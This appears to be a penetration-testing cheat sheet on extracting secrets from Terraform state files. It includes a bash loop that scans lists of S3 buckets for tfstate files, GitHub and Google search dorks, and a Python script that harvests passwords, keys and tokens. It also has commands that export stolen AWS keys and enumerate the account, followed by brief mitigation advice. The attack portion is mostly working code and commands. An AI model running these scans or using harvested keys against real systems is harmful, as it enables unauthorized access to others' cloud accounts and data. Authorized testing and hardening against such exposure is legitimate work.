# Terraform State File Secrets Extraction

Terraform state files (`terraform.tfstate`) contain plaintext secrets and are often accidentally exposed.

## What's in State Files

```json
{
  "resources": [{
    "type": "aws_db_instance",
    "instances": [{
      "attributes": {
        "username": "admin",
        "password": "SuperSecret123!",   // PLAINTEXT
        "endpoint": "db.xxxxx.us-east-1.rds.amazonaws.com"
      }
    }]
  }]
}
```

State files contain:
- Database passwords
- API keys (in provider configs)
- Private SSH keys
- TLS private keys
- IAM access keys
- S3 bucket names and policies

## Finding Exposed State Files

```bash
# S3 buckets with state files
aws s3 ls s3://company-terraform --recursive | grep tfstate

# Search GitHub
# Google dork: extension:tfstate "password"
# GitHub code search: extension:tfstate

# Search S3 buckets
for bucket in $(cat buckets.txt); do
  aws s3 ls "s3://$bucket" --recursive 2>/dev/null | grep tfstate
done
```

## Extracting Secrets

```python
import json
import re

def extract_secrets(tfstate_path):
    with open(tfstate_path) as f:
        state = json.load(f)

    secrets = []
    patterns = [
        r'password', r'secret', r'private_key', r'api_key',
        r'access_key', r'token', r'certificate'
    ]

    def search_dict(obj, path=""):
        if isinstance(obj, dict):
            for k, v in obj.items():
                if any(re.search(p, k, re.I) for p in patterns):
                    if isinstance(v, str) and len(v) > 3:
                        secrets.append((f"{path}.{k}", v))
                search_dict(v, f"{path}.{k}")
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                search_dict(item, f"{path}[{i}]")

    search_dict(state)
    return secrets

for path, value in extract_secrets("terraform.tfstate"):
    print(f"{path}: {value[:50]}...")
```

## Common Exposure Points

1. **S3 buckets** - misconfigured public access
2. **Git repos** - committed `.tfstate` files
3. **CI/CD logs** - terraform plan output
4. **Shared storage** - NFS, EFS without auth
5. **Local developer machines** - unencrypted disks

## Using Extracted AWS Keys

```bash
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
aws sts get-caller-identity
aws s3 ls
aws rds describe-db-instances
```

## Mitigation

- Never commit `.tfstate` to git (add to .gitignore)
- Use remote state with encryption:
```hcl
terraform {
  backend "s3" {
    bucket         = "private-terraform-state"
    key            = "prod/terraform.tfstate"
    region         = "us-east-1"
    encrypt        = true
    dynamodb_table = "terraform-locks"
  }
}
```
- Use `aws_kms_secrets` data source for sensitive values
- Rotate secrets after state exposure
- Restrict S3 bucket access with bucket policies
